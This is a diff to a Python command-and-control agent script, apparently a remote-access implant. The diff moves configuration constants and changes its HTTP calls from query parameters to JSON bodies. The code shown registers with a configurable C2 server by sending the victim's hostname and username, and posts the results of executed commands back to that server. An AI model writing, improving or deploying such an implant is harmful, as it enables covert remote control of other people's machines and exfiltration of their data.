@@ -1,18 +1,10 @@
 import requests as rq
 from sys import argv
+from functions import *
 import time
 import os
 from pathlib import Path
 import subprocess
-
-# Configuration constants
-SERVER_IP = None
-AGENT_ID = None
-REQUEST_TIMEOUT = 30  # seconds for most requests
-UPLOAD_TIMEOUT = 120  # seconds for file uploads
-DOWNLOAD_TIMEOUT = 120  # seconds for file downloads
-SLEEP_TIME = 3
-
 
 # Global working directory state
 cwd = os.getcwd()
@@ -99,9 +91,18 @@ def list_directory(path):
         return json.dumps({"status": "error", "error": str(e)})
 
 
+
+# Configuration constants
+SERVER_IP = None
+AGENT_ID = None
+REQUEST_TIMEOUT = 30  # seconds for most requests
+UPLOAD_TIMEOUT = 120  # seconds for file uploads
+DOWNLOAD_TIMEOUT = 120  # seconds for file downloads
+SLEEP_TIME = 3
+
 # function to send to server a join request to c2
 def connect():
-    r = rq.post(f"http://{SERVER_IP}/join", params={
+    r = rq.post(f"http://{SERVER_IP}/join", json={
         'hostname': get_hostname(),
         'user': get_whoami()
     }, timeout=REQUEST_TIMEOUT).json()
@@ -296,7 +297,7 @@ def send_result(command_id, result):
         'result': result.get('result'),
         'error': result.get('error')
     }
-    r = rq.post(f"http://{SERVER_IP}/agent/set_command_result", params=params, timeout=REQUEST_TIMEOUT)
+    r = rq.post(f"http://{SERVER_IP}/agent/set_command_result", json=params, timeout=REQUEST_TIMEOUT)
     print(f"[+] Result sent: {r.json()}")
 
 
